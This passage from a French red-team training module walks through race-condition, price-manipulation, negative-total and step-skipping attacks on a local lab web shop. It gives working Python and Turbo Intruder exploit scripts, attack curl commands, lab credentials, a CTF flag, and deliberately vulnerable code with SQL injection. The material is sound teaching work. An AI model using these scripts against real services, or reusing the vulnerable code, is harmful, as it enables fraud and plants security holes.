| Commande/Option | Rôle/Explication |
|------|------|
| `pip3 install turbointruder` | Installe le paquet Python `turbointruder`. Outil spécialisé dans les attaques de race condition : envoie des lots de requêtes simultanées pour exploiter les fenêtres de temps (TOCTOU). |


**Script d'attaque de race condition :**

```python
#!/usr/bin/env python3
"""
Turbo Intruder — Script d'attaque Race Condition
Cible : /api/transfer avec le coupon VIP50 (50% de réduction)
Principe : envoyer N requêtes simultanées pour que plusieurs passent la vérification
avant que l'une d'elles n'ait marqué le coupon comme utilisé.
"""
import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3 import disable_warnings

# Désactive les avertissements SSL (certificats auto-signés du lab)
disable_warnings()

# Configuration de l'attaque
BASE = "http://localhost:8080"      # URL du laboratoire
COUPON = "VIP50"                    # Nom du coupon à attaquer
AMOUNT = 1000                       # Montant à créditer
NUM_THREADS = 50                    # Nombre de threads (requêtes simultanées)

def attack(session):
    """Envoie une requête de transfert avec le coupon.
    Chaque thread tente d'utiliser le même coupon simultanément.
    """
    resp = session.post(f"{BASE}/api/transfer", data={
        "coupon": COUPON,
        "amount": AMOUNT
    }, timeout=10)
    try:
        data = resp.json()
        if data.get("success"):
            return f"[+] SUCCESS — Discount: {data.get('discount')} — Final: {data.get('final')}"
        elif "déjà utilisé" in str(data.get("error", "")):
            return "[-] Coupon déjà utilisé"
        else:
            return f"[-] {data.get('error', resp.text[:100])}"
    except Exception as e:
        return f"[!] Erreur: {e}"

def main():
    # Création d'une session HTTP persistante (conserve le JWT)
    base_session = requests.Session()
    # Connexion avec le compte user standard
    base_session.post(f"{BASE}/login", data={
        "email": "user@ecovault.com",
        "password": "User2026!"
    })

    print(f"[*] Lancement de {NUM_THREADS} requêtes parallèles sur /api/transfer")
    print(f"[*] Coupon: {COUPON}, Montant: {AMOUNT}")
    print("="*60)

    results = []
    # ThreadPoolExecutor : pool de threads pour exécuter les requêtes en parallèle
    # max_workers=NUM_THREADS : nombre maximum de threads simultanés
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        # Soumet NUM_THREADS tâches identiques au pool
        futures = [executor.submit(attack, base_session) for _ in range(NUM_THREADS)]
        # as_completed : itère sur les résultats au fur et à mesure qu'ils se terminent
        for future in as_completed(futures):
            results.append(future.result())

    # Affichage des résultats de chaque thread
    for r in results:
        print(r)

    # Comptage des succès — si > 1, la race condition est exploitée
    successes = [r for r in results if "[+] SUCCESS" in r]
    print(f"\n[+] {len(successes)}/{NUM_THREADS} requêtes ont réussi (race condition exploitée)")

if __name__ == "__main__":
    main()
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `ThreadPoolExecutor(max_workers=50)` | Pool de 50 threads pour exécuter les requêtes simultanément. Chaque thread tente d'utiliser le même coupon en parallèle. |
| `executor.submit(attack, base_session)` | Soumet la fonction `attack` au pool de threads avec `base_session` comme argument. Retourne un objet `Future` représentant le résultat à venir. |
| `as_completed(futures)` | Itérateur qui produit les résultats au fur et à mesure que les threads se terminent (ordre non déterministe). |
| `session.post(...)` | Chaque thread envoie sa propre requête POST vers `/api/transfer` avec les mêmes données (même coupon, même montant). |
| `timeout=10` | Délai d'attente maximum de 10 secondes par requête. Évite qu'un thread bloque indéfiniment. |
| `disable_warnings()` | Désactive les avertissements SSL pour les certificats auto-signés du laboratoire. |
| Comptage des succès | Si plusieurs threads retournent `SUCCESS`, le coupon a été utilisé plusieurs fois → race condition exploitée. |

```bash
# Exécution du script d'attaque par race condition
# Le script lance 50 threads qui tentent tous d'utiliser le coupon VIP50
# Si la race condition est présente, plusieurs threads réussiront
python3 race_condition_turbo.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `python3 race_condition_turbo.py` | Exécute le script de race condition. Lance 50 requêtes parallèles sur `/api/transfer` avec le coupon VIP50. Affiche le nombre de succès. |


### 4.3 Cas concrets de Race Condition

#### 4.3.1 Double Spending (dépense multiple)

**Scénario :** Un coupon de réduction ne peut être utilisé qu'une fois. L'attaquant envoie 50 requêtes simultanées pour utiliser le même coupon 50 fois.

#### 4.3.2 Vote Multiple

**Scénario :** Un système de vote limite un vote par utilisateur. L'attaquant envoie des votes simultanés pour voter plusieurs fois.

```python
# Exemple conceptuel — attaque par race condition sur un système de vote
# Le système limite normalement un vote par utilisateur
# Mais l'envoi simultané de 100 requêtes peut contourner cette limite

# Endpoint et payload du vote
endpoint = "POST /api/vote"           # URL de l'API de vote
payload = {"candidate_id": 1}         # Vote pour le candidat 1

# 100 votes simultanés via ThreadPoolExecutor
# Chaque requête vérifie "a déjà voté ?" avant d'enregistrer
# Si toutes arrivent en même temps, les 100 vérifications passent avant
# qu'aucun enregistrement ne soit fait → 100 votes au lieu de 1
for _ in range(100):
    executor.submit(session.post, endpoint, json=payload)
```

**Explication du script :**
| Élément | Rôle/Explication |
|------|------|
| `executor.submit(session.post, endpoint, json=payload)` | Soumet une requête POST asynchrone au pool de threads. 100 requêtes sont soumises quasi-simultanément. |
| Race condition | Chaque requête vérifie "l'utilisateur a-t-il déjà voté ?" ; avec 100 requêtes simultanées, toutes passent la vérification avant que la première n'enregistre le vote. |


#### 4.3.3 Limit Bypass (contournement de limite)

**Scénario :** Un utilisateur ne peut transférer que 100€ par jour. L'attaquant envoie 10 transferts simultanés de 100€ → 1000€ transférés.

#### 4.3.4 2FA Bypass par Race Condition

**Scénario :** L'application vérifie le code 2FA et marque la session comme vérifiée. Si le marquage n'est pas atomique :

```
Time 0  : Requête 1 → vérification code (en cours)
Time +1ms: Requête 2 → vérification code (en cours) — session PAS ENCORE marquée
Time +2ms: Requête 1 → marquage session ✅
Time +3ms: Requête 2 → marquage session ✅ (contournement !)
```

### 4.4 Analyse du code vulnérable

```python
# Extrait de app.py — ligne 314-323 — Code vulnérable aux race conditions
# Logique métier de validation et d'utilisation d'un coupon de réduction

# Vérifie si le paramètre 'coupon' est présent dans la requête
if coupon:
    # Requête SQL pour récupérer les infos du coupon
    # Faille : injection SQL possible (concaténation directe de 'coupon')
    coupon_info = query_db(f"SELECT * FROM coupons WHERE code='{coupon}'", one=True)
    # Vérification : le coupon existe ET n'a pas encore été utilisé
    if coupon_info and not coupon_info['used']:
        # Vérification OK — le coupon est valide et disponible
        # ⚠️ DÉLAI VOLONTAIRE — crée la fenêtre de race condition
        # Pendant ce time.sleep(1), les requêtes parallèles arrivent
        # et TOUTES passent la vérification 'not coupon_info["used"]'
        # car AUCUNE n'a encore exécuté le UPDATE ci-dessous
        time.sleep(1)
        # Marquer comme utilisé
        # TOCTOU : Time-of-Check (vérification ci-dessus) ≠ Time-of-Use (cette mise à jour)
        query_db(f"UPDATE coupons SET used=TRUE WHERE code='{coupon}'")
        # Calcul de la réduction
        discount = amount * coupon_info['discount_percent'] / 100
```

**Explication du code vulnérable :**
| Élément | Rôle/Explication |
|------|------|
| `query_db(f"SELECT * FROM coupons WHERE code='{coupon}'", one=True)` | Requête SQL non paramétrée (injection SQL possible). Vérifie l'existence et le statut du coupon. |
| `if coupon_info and not coupon_info['used']` | **Time-of-Check (TOC)** : vérifie que le coupon n'est pas utilisé. |
| `time.sleep(1)` | **Délai artificiel** de 1 seconde entre la vérification et la mise à jour. Pendant cette fenêtre, les requêtes parallèles passent toutes la vérification. |
| `query_db(f"UPDATE coupons SET used=TRUE WHERE code='{coupon}'")` | **Time-of-Use (TOU)** : marque le coupon comme utilisé. Trop tard — les autres threads ont déjà passé le check. |
| `TOCTOU` | Time-of-Check Time-of-Use : le délai entre vérification et action crée une vulnérabilité. |


### 4.5 TP Guidé — Race Condition sur `/api/transfer`

**Objectif :** Utiliser le coupon `VIP50` (50% de réduction, utilisable une fois) plusieurs fois via une race condition.

**Étape 1 — Vérifier l'état initial du coupon**

```bash
# Étape 1 : Connexion au laboratoire avec le compte user standard
# -c /tmp/race_cookies.txt : stocke le cookie JWT dans un fichier dédié pour l'exercice
curl -c /tmp/race_cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!" -L

# Étape 2 : Test d'une utilisation normale du coupon VIP50
# -b /tmp/race_cookies.txt : réutilise la session JWT
# -d "coupon=VIP50&amount=100" : utilise le coupon avec un montant de 100€
# Réponse attendue : discount=50 (50% de réduction), final=50
curl -b /tmp/race_cookies.txt -X POST http://localhost:8080/api/transfer \
  -d "coupon=VIP50&amount=100"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -c /tmp/race_cookies.txt ... -L` | Connexion et sauvegarde du JWT dans `/tmp/race_cookies.txt`. |
| `curl -b /tmp/race_cookies.txt -X POST /api/transfer` | Requête POST vers l'endpoint de transfert. Utilise le coupon VIP50. |
| `-d "coupon=VIP50&amount=100"` | Paramètres : `coupon=VIP50` (code promo), `amount=100` (montant de 100€ sur lequel appliquer la réduction de 50%). |


Réponse attendue (première utilisation) :

```json
{
    "success": true,
    "original": 100.0,
    "discount": 50.0,
    "final": 50.0,
    "coupon": "VIP50"
}
```

**Étape 2 — Vérifier que le coupon est marqué comme utilisé**

```bash
# Deuxième tentative d'utilisation du même coupon (devrait échouer)
# Après la première utilisation, le coupon est marqué comme 'used=TRUE' en base
# Le serveur doit normalement refuser avec une erreur "Coupon déjà utilisé"
# -b /tmp/race_cookies.txt : même session JWT
# -d "coupon=VIP50&amount=100" : mêmes paramètres que la première tentative
curl -b /tmp/race_cookies.txt -X POST http://localhost:8080/api/transfer \
  -d "coupon=VIP50&amount=100"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -b /tmp/race_cookies.txt -X POST ...` | Même requête que la première utilisation. Le coupon devrait être marqué comme `used` en base. |
| Réponse attendue | `{"error": "Coupon déjà utilisé ou invalide"}` — confirme que le coupon a bien été marqué comme utilisé après la première requête. |


```json
{"error": "Coupon déjà utilisé ou invalide"}
```

**Étape 3 — Réinitialiser le lab**

```bash
# Réinitialisation du laboratoire pour revenir à un état initial
# Nécessaire après avoir utilisé le coupon une fois (remet 'used' à FALSE)
# cd : se déplace dans le répertoire du laboratoire
# ./setup.sh reset : exécute le script de configuration avec l'argument 'reset'
#   Ce script réinitialise la base de données, les sessions, et les coupons
cd /home/yug/Documents/sdv-m2-red-team-2026/lab
./setup.sh reset
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `cd /home/yug/Documents/sdv-m2-red-team-2026/lab` | Se déplace dans le répertoire du laboratoire contenant les scripts de gestion. |
| `./setup.sh reset` | Exécute le script `setup.sh` avec l'argument `reset`. Ce script réinitialise la base de données (remet le coupon VIP50 à `used=FALSE` pour permettre une nouvelle tentative). |


**Étape 4 — Exécuter l'attaque de race condition**

```python
#!/usr/bin/env python3
"""
race_exploit.py — Race condition sur le coupon VIP50
Exploite le délai time.sleep(1) entre la vérification et la mise à jour du coupon.
30 requêtes simultanées tentent d'utiliser le même coupon — plusieurs devraient réussir.
"""
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# URL de base du laboratoire
BASE = "http://localhost:8080"

# Session HTTP persistante (conserve le JWT automatiquement)
s = requests.Session()
# Connexion avec le compte user standard
s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})

def use_coupon(n):
    """Tente d'utiliser le coupon VIP50. Chaque appel est fait depuis un thread différent."""
    r = s.post(f"{BASE}/api/transfer", data={"coupon": "VIP50", "amount": 100})
    try:
        d = r.json()
        if d.get("success"):
            return f"[{n}] ✅ SUCCÈS — final={d['final']}€ (économisé {d['discount']}€)"
        return f"[{n}] ❌ {d.get('error', 'inconnu')[:40]}"
    except:
        return f"[{n}] ⚠️ Erreur HTTP {r.status_code}"

# Lancement de 30 requêtes en parallèle via ThreadPoolExecutor
# max_workers=30 : jusqu'à 30 threads simultanés
# Chaque thread exécute use_coupon(i) avec un index unique i
with ThreadPoolExecutor(max_workers=30) as ex:
    # Soumet 30 tâches au pool d'exécution
    fut = [ex.submit(use_coupon, i) for i in range(30)]
    # as_completed : itère sur les résultats dans l'ordre de completion
    for f in as_completed(fut):
        print(f.result())
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `ThreadPoolExecutor(max_workers=30)` | Pool de 30 threads. Chaque thread exécute `use_coupon()` simultanément pour créer une race condition. |
| `ex.submit(use_coupon, i)` | Soumet la fonction `use_coupon` avec l'argument `i` (index du thread) au pool d'exécution. |
| `as_completed(fut)` | Itérateur qui retourne les résultats dans l'ordre où les threads se terminent (pas dans l'ordre de soumission). |
| `r.json()` | Parse la réponse JSON du serveur. |
| `d.get("success")` | Vérifie si la réponse contient `"success": true`. Si oui, le thread a réussi à utiliser le coupon. |
| `len(successes)` | Compte le nombre de threads ayant réussi. Si > 1, la race condition est confirmée. |

```bash
# Exécution du script d'exploitation de race condition
# 30 requêtes simultanées : plusieurs devraient réussir à utiliser VIP50
# Résultat attendu : un mélange de ✅ SUCCÈS et ❌ erreurs
python3 race_exploit.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `python3 race_exploit.py` | Lance le script de race condition. 30 threads attaquent simultanément le endpoint `/api/transfer` avec le coupon VIP50. |


Sortie attendue :

```
[3] ❌ Coupon déjà utilisé ou invalide
[7] ❌ Coupon déjà utilisé ou invalide
[1] ✅ SUCCÈS — final=50.0€ (économisé 50.0€)
[2] ✅ SUCCÈS — final=50.0€ (économisé 50.0€)
[4] ✅ SUCCÈS — final=50.0€ (économisé 50.0€)
[9] ❌ Coupon déjà utilisé ou invalide
...
```

**Explication du résultat :**
| Observation | Explication |
|------|------|
| Plusieurs `✅ SUCCÈS` | Plusieurs threads passent la vérification `not coupon_info['used']` avant que le `UPDATE` ne soit exécuté. |
| Mélange de succès et échecs | Les premiers threads à exécuter le `UPDATE` marquent le coupon comme utilisé, les threads suivants reçoivent l'erreur "Coupon déjà utilisé". |
| Résultat | La race condition est confirmée : le coupon VIP50 a été utilisé plusieurs fois au lieu d'une seule. |


**Étape 5 — Avec Turbo Intruder (Burp Suite)**

1. Intercepter la requête POST `/api/transfer` avec le coupon VIP50
2. `Ctrl+I` → Envoyer à Turbo Intruder
3. Coller ce script dans l'éditeur :

```python
# Script Turbo Intruder pour attaque de race condition
# Fonction principale : prépare et envoie les requêtes
def queueRequests(target, wordlists):
    # Configuration du moteur de requêtes
    # RequestEngine : moteur qui gère l'envoi des requêtes HTTP en parallèle
    # concurrentConnections=50 : 50 connexions TCP simultanées
    # requestsPerConnection=50 : 50 requêtes par connexion (pipelining HTTP)
    # pipeline=True : active le pipelining HTTP (plusieurs requêtes sans attendre la réponse)
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=50,
                           pipeline=True)

    # Boucle : envoie 50 requêtes identiques en rafale
    # Toutes les requêtes sont mises en file avant qu'aucune réponse ne soit reçue
    # Cela maximise la probabilité de race condition
    for i in range(50):
        engine.queue(target.req, None)

# Fonction callback : traite chaque réponse reçue
def handleResponse(req, interesting):
    # Ajoute la requête/réponse à la table de résultats dans l'interface Turbo Intruder
    table.add(req)
```

**Explication du script Turbo Intruder :**
| Élément | Rôle/Explication |
|------|------|
| `RequestEngine(endpoint=target.endpoint)` | Moteur de requêtes Turbo Intruder. Configure le mode d'envoi parallélisé. |
| `concurrentConnections=50` | Nombre de connexions TCP simultanées. Plus ce nombre est élevé, plus les requêtes arrivent en même temps sur le serveur. |
| `requestsPerConnection=50` | Nombre de requêtes par connexion. Utilisé avec `pipeline=True` pour envoyer plusieurs requêtes sans attendre la réponse de chacune. |
| `pipeline=True` | Active le pipelining HTTP/1.1 : envoie plusieurs requêtes sur la même connexion TCP avant d'avoir reçu les réponses. |
| `engine.queue(target.req, None)` | Ajoute une requête à la file d'envoi. `None` = pas de payload de wordlist (toutes les requêtes sont identiques). |
| `handleResponse(req, interesting)` | Callback appelée pour chaque réponse reçue. `table.add(req)` ajoute la réponse à l'interface graphique. |


4. Cliquer sur « Attack »
5. Observer les réponses dans l'onglet Results — plusieurs `200 OK` avec `"success": true`

**Flag obtenu :** Pas de flag spécifique pour cet exercice, mais le principe de race condition est démontré.

---

## 5. Logique Métier — Workflow Abuse

**Tag MITRE ATT&CK :** T1068 — Exploitation for Privilege Escalation

### 5.1 Pattern 1 — Manipulation de Prix

**Principe :** L'application accepte le prix (ou le montant total) directement depuis le client, sans le recalculer côté serveur.

```http
POST /api/order HTTP/1.1
Content-Type: application/json

{
    "product_id": 5,
    "quantity": 1,
    "price": 0.01
}
```

Si le serveur utilise `price` pour calculer le total sans le vérifier par rapport à la base de données, l'attaquant peut acheter un produit à 1499€ pour 0.01€.

**Détection :**

# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
```bash
# Test de manipulation de prix — détection de vulnérabilité métier

# 1. Commande normale — prix correct fourni par le client
# On envoie le prix réel du produit (1499.00€) comme référence
# -H "Content-Type: application/json" : indique que le corps est en JSON
# -d '{"product_id": 5, "quantity": 1, "price": 1499.00}' : commande d'1 unité à 1499.00€
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 5, "quantity": 1, "price": 1499.00}'

# 2. Commande avec prix manipulé — tentative d'achat à 0.01€
# Même produit, même quantité, mais prix modifié à 0.01€
# Si le serveur utilise le prix fourni sans le recalculer depuis la base,
# l'attaquant peut acheter le produit à 0.01€ au lieu de 1499.00€
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 5, "quantity": 1, "price": 0.01}'
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `-H "Content-Type: application/json"` | En-tête HTTP indiquant que le corps de la requête est au format JSON. Le serveur saura parser les données correctement. |
| `-d '{"product_id": 5, "quantity": 1, "price": 1499.00}'` | Corps JSON de la requête. `product_id`: identifiant du produit, `quantity`: quantité, `price`: prix unitaire fourni par le client. |
| Première commande | Requête de référence avec le prix normal. Permet de voir le comportement attendu. |
| Deuxième commande | **Test de vulnérabilité** : prix modifié à 0.01€. Si le serveur ne recale pas le prix depuis la base, la commande passe avec le prix frauduleux. |


**Analyse du code vulnérable :**

```python
# Extrait de app.py — ligne 344-346 — Code vulnérable : manipulation de prix
# Le prix est récupéré directement depuis les données JSON envoyées par le client
# data.get('price', 0) : extrait le champ 'price' du JSON, valeur par défaut 0
# float() : convertit la valeur en nombre flottant
# ⚠️ BUSINESS LOGIC — Le prix est fourni par le client sans vérification
# Le serveur DEVRAIT ignorer le prix client et le récupérer depuis la base
# de données en fonction de product_id (prix stocké côté serveur)
price = float(data.get('price', 0))
# ⚠️ BUSINESS LOGIC — Le prix est fourni par le client
```

**Explication du code vulnérable :**
| Élément | Rôle/Explication |
|------|------|
| `data.get('price', 0)` | Extrait le champ `price` du JSON de la requête. Valeur par défaut 0 si absent. |
| `float(...)` | Convertit la valeur en nombre à virgule flottante pour le calcul du total. |
| Vulnérabilité | Le prix n'est pas recalculé côté serveur à partir de la base de données. L'attaquant peut envoyer n'importe quel prix (0.01€ pour un produit à 1499€). |


### 5.2 Pattern 2 — Integer Overflow / Négatif

**Principe :** L'attaquant envoie des valeurs négatives ou très grandes pour provoquer un comportement non prévu.

**Cas du prix négatif :**

```http
POST /api/order HTTP/1.1
Content-Type: application/json

{
    "product_id": 5,
    "quantity": -1,
    "price": 1499.00
}
```

Si le total est calculé comme `quantity * price`, un `quantity` négatif donne un total négatif → l'application pourrait "rembourser" l'attaquant.

**Cas de l'overflow :**

```json
{
    "product_id": 5,
    "quantity": 1,
    "price": 0,
    "total": -999999
}
```

**Analyse du code vulnérable :**

```python
# Extrait de app.py — ligne 348-353
if price <= 0:
    # ⚠️ BUSINESS LOGIC — Integer overflow possible
    total = int(data.get('total', 0))
    if total < 0:
        return jsonify({
            'success': True,
            'message': 'flag{business_logic_overflow_2026}',
            'credit': abs(total)
        })
```

**Explication du code :**
| Condition | Rôle |
|------|------|
| `if price <= 0` | Première condition : le prix est nul ou négatif (anormal mais non bloqué). |
| `if total < 0` | Deuxième condition : le total est négatif. Cumulée avec `price <= 0`, le flag est délivré. |
| `abs(total)` | La valeur absolue du total négatif est créditée sur le compte. L'attaquant reçoit un crédit frauduleux. |


### 5.3 Pattern 3 — Workflow Step Skipping

**Principe :** L'application impose un flux en plusieurs étapes (panier → adresse → paiement → confirmation), mais chaque étape est accessible via une URL distincte. L'attaquant saute les étapes de vérification.

**Exemple :**

```
Étapes normales :
  POST /cart/checkout         → 200 (total calculé)
  POST /checkout/address      → 200 (adresse validée)
  POST /checkout/payment      → 200 (paiement validé)
  POST /checkout/confirm      → 200 (commande créée)

Attaque (saut d'étapes) :
  POST /checkout/confirm      → 200 (commande créée sans passer par le paiement !)
```

**Détection :**

```bash
# Attaque par saut d'étapes (workflow step skipping)
# On accède directement à l'étape finale du checkout sans passer par les étapes intermédiaires
# (panier → adresse → paiement → confirmation)
# Si le serveur ne vérifie pas le state (état d'avancement), la commande est créée sans paiement

# -X POST : méthode HTTP pour créer/confirmer la commande
# -b /tmp/cookies.txt : session JWT du compte user
# -d '{"order_id": 42}' : identifiant de la commande à confirmer
# -w "\nHTTP %{http_code}\n" : (write-out) affiche le code HTTP après le corps de la réponse
#   %{http_code} : variable curl qui donne le code HTTP (200, 403, etc.)
#   \n : retour à la ligne pour une meilleure lisibilité
curl -X POST http://localhost:8080/checkout/confirm \
  -b /tmp/cookies.txt \
  -d '{"order_id": 42}' \
  -w "\nHTTP %{http_code}\n"
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -X POST http://localhost:8080/checkout/confirm` | Requête POST directement vers l'étape de confirmation, sans passer par les étapes de panier, adresse, et paiement. |
| `-d '{"order_id": 42}'` | Corps JSON contenant l'ID de la commande à confirmer. |
| `-w "\nHTTP %{http_code}\n"` | Affiche le code HTTP de la réponse après le corps. Utile pour vérifier rapidement si la requête a réussi (200) ou a été refusée (403). |


### 5.4 Pattern 4 — Parameter Pollution

**Principe :** L'attaquant envoie le même paramètre plusieurs fois. Le comportement du serveur dépend de la manière dont il traite les paramètres dupliqués.

**HTTP Parameter Pollution (HPP) :**

```http
POST /api/transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=100&amount=999999&coupon=VIP50
```

**Comportements possibles selon la pile technique :**

| Technologie | Dernier paramètre | Premier paramètre | Tous (liste) |
|-------------|-------------------|-------------------|--------------|
| PHP/Apache  | ✅ (`999999`) | ❌ | ❌ |
| Python/Flask | ❌ | ✅ (`100`) | ❌ |
| ASP.NET/IIS | ✅ | ❌ | ❌ |
| Node.js/Express | ❌ | ✅ | ❌ |
| Java/Tomcat | ❌ | ✅ | ❌ |

**CSV Injection (exemple connexe) :**

```http
POST /api/export HTTP/1.1
Content-Type: application/json

{
    "collection": "users",
    "filter": {"role": {"$ne": "nonexistent"}}
}
```

### 5.5 TP Guidé — Manipuler `/api/order` pour le flag overflow

**Objectif :** Exploiter l'integer overflow dans le endpoint `/api/order` pour obtenir le flag.

**Étape 1 — Analyser le endpoint**

```bash
# Étape 1 : Test d'une commande normale — établir le comportement de référence
# Requête POST vers /api/order avec des paramètres standards
# -b /tmp/cookies.txt : session JWT du compte user
# -H "Content-Type: application/json" : format JSON
# -d '{"product_id": 1, "quantity": 2, "price": 99.99}' :
#   product_id=1 : identifiant du produit
#   quantity=2 : quantité commandée
#   price=99.99 : prix unitaire fourni par le client
# Réponse attendue : {"success": true, "total": 199.98, ...}
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 2, "price": 99.99}'
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `curl -b /tmp/cookies.txt -X POST /api/order` | Requête POST vers le endpoint de commande avec authentification JWT. |
| `-d '{"product_id": 1, "quantity": 2, "price": 99.99}'` | Commande normale : 2 unités du produit 1 à 99.99€ l'unité. Total attendu = 199.98€. |


```json
{
    "success": true,
    "product_id": 1,
    "quantity": 2,
    "price": 99.99,
    "total": 199.98,
    "message": "Commande enregistrée"
}
```

**Étape 2 — Tester la condition `price <= 0`**

```bash
# Étape 2 : Test de la condition 'price <= 0' — première condition du flag
# On envoie price=0 pour déclencher la branche conditionnelle vulnérable
# (voir le code : if price <= 0: ...)
# Sans le paramètre 'total', la valeur par défaut est 0 — pas encore de flag
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1, "price": 0}'
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `"price": 0` | Prix à 0€. Déclenche la condition `if price <= 0` dans le code vulnérable. |

**Étape 3 — Envoyer un total négatif avec price = 0**

```bash
# Étape 3 : Envoi d'un total négatif avec price=0 — déclenchement du flag
# On satisfait les DEUX conditions du code vulnérable :
#   1. price <= 0 → vrai (price = 0)
#   2. total < 0 → vrai (total = -999999)
# Le flag est délivré et le crédit est la valeur absolue du total
# {"success": true, "message": "flag{business_logic_overflow_2026}", "credit": 999999}
curl -b /tmp/cookies.txt -X POST http://localhost:8080/api/order \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1, "price": 0, "total": -999999}'
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `"price": 0` | Déclenche la première condition : `if price <= 0`. |
| `"total": -999999` | Déclenche la seconde condition : `if total < 0`. La valeur négative provoque l'émission du flag. |
| Réponse attendue | Le serveur retourne le flag `flag{business_logic_overflow_2026}` et crédite `999999` (valeur absolue du total négatif). |


Réponse :

```json
{
    "success": true,
    "message": "flag{business_logic_overflow_2026}",
    "credit": 999999
}
```

**Flag obtenu :** `flag{business_logic_overflow_2026}`

**Étape 4 — Comprendre le mécanisme**

```python
# Logique vulnérable — extrait de app.py
# Code métier qui traite les commandes avec un prix <= 0
if price <= 0:                      # Condition 1 : prix <= 0
    # Récupère le total depuis les données JSON envoyées par le client
    # ⚠️ Le total est FOURNI PAR LE CLIENT — aucune vérification côté serveur
    # int() : convertit en entier (troncature de la valeur)
    # data.get('total', 0) : extrait 'total' du JSON, défaut 0
    total = int(data.get('total', 0))
    if total < 0:                   # Condition 2 : total négatif
        # Si les deux conditions sont remplies, le flag est délivré
        # abs(total) : valeur absolue du total négatif → crédit positif
        # Vulnérabilité : l'attaquant reçoit un crédit frauduleux
        # ET le flag de validation de l'exercice
        return jsonify({
            'success': True,
            'message': 'flag{...}',  # Flag délivré
            'credit': abs(total)      # Crédit frauduleux (positif)
        })
```

**Explication du code vulnérable :**
| Élément | Rôle/Explication |
|------|------|
| `if price <= 0` | Première condition : un prix inférieur ou égal à 0 est anormal mais n'est pas bloqué. |
| `int(data.get('total', 0))` | Récupère le champ `total` depuis les données JSON **fournies par le client**. Aucune validation : l'attaquant peut envoyer n'importe quelle valeur. |
| `if total < 0` | Deuxième condition : total négatif. Normalement impossible (quantité * prix > 0). |
| `abs(total)` | Fonction valeur absolue. Convertit le total négatif en crédit positif. L'attaquant se fait créditer `abs(-999999)` = 999999€. |
| Flag | Le flag `flag{business_logic_overflow_2026}` est délivré comme message de réussite. |


**Étape 5 — Automatisation**

```python
#!/usr/bin/env python3
"""
overflow_exploit.py — Obtention du flag via integer overflow
Exploite la vulnérabilité de logique métier dans /api/order :
- price=0 déclenche la première condition
- total=-999999 déclenche la seconde condition
- Le flag est retourné et un crédit frauduleux est accordé
"""
import requests

# URL de base du laboratoire
BASE = "http://localhost:8080"

# Session HTTP persistante (conserve le JWT)
s = requests.Session()
# Connexion avec le compte user standard
s.post(f"{BASE}/login", data={"email": "user@ecovault.com", "password": "User2026!"})

# Requête d'exploitation : price=0 + total negatif
# Utilise json= (et non data=) pour envoyer automatiquement le Content-Type: application/json
# et sérialiser le dictionnaire en JSON
r = s.post(f"{BASE}/api/order", json={
    "product_id": 1,
    "quantity": 1,
    "price": 0,          # Déclenche if price <= 0
    "total": -999999     # Déclenche if total < 0 → flag + crédit
})

# Affichage de la réponse JSON complète
# Attendu : {"success": true, "message": "flag{business_logic_overflow_2026}", "credit": 999999}
print(r.json())
```

**Explication du script Python :**
| Élément | Rôle/Explication |
|------|------|
| `requests.Session()` | Session HTTP persistante. Conserve le cookie JWT après la connexion. |
| `s.post(f"{BASE}/login", data=...)` | Connexion initiale. Le JWT est stocké dans la session. |
| `s.post(f"{BASE}/api/order", json=...)` | Requête POST avec le paramètre `json=`. `requests` sérialise automatiquement le dictionnaire en JSON et ajoute l'en-tête `Content-Type: application/json`. |
| `"price": 0` | Déclenche la condition `if price <= 0:` dans le code vulnérable. |
| `"total": -999999` | Déclenche la condition `if total < 0:` dans le code vulnérable. La valeur négative provoque l'émission du flag. |
| `r.json()` | Parse la réponse JSON. Affiche le message (flag) et le crédit frauduleux. |

```bash
# Exécution du script d'exploitation de l'integer overflow
# Le script se connecte, envoie la requête avec price=0 et total négatif
# Affiche la réponse contenant le flag
python3 overflow_exploit.py
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|------|------|
| `python3 overflow_exploit.py` | Lance le script d'exploitation. Affiche le flag `flag{business_logic_overflow_2026}` et le crédit `999999€`. |


---

## 6. TP Synthèse

### 6.1 Parcours d'attaque complet

**Objectif :** Enchaîner les vulnérabilités du Module 3 pour passer d'un utilisateur standard à l'obtention du flag overflow.

**Déroulement :**

```
user@ecovault.com
    │
    ├── 1. IDOR (T1548)
    │   └── GET /api/profile/1 → flag{admin_api_key_4a7b9c}
    │
    ├── 2. JWT Forge (T1078 / T1134)
    │   ├── Option A: None algorithm
    │   ├── Option B: HMAC/RSA confusion
    │   └── Option C: Kid injection (/dev/null)
    │   └── Résultat: Token admin → accès /admin/debug
    │
    ├── 3. Business Logic Overflow (T1068)
